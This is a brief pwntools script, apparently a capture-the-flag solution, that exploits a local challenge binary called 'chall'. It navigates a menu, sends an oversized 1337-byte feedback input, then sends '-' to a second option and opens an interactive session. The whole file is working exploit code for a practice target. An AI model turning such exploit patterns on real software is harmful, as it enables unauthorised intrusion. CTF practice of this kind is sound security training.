from pwn import *

context.binary = exe = ELF('./chall')

io = process()

io.recvuntil(b'Option: ')
io.sendline(b'2')
io.recvuntil(b'feedback: ')
io.sendline(b'i'*1337)

io.recvuntil(b'Option: ')
io.sendline(b'1')
io.recvuntil(b'> ')
io.sendline(b'-')

io.interactive()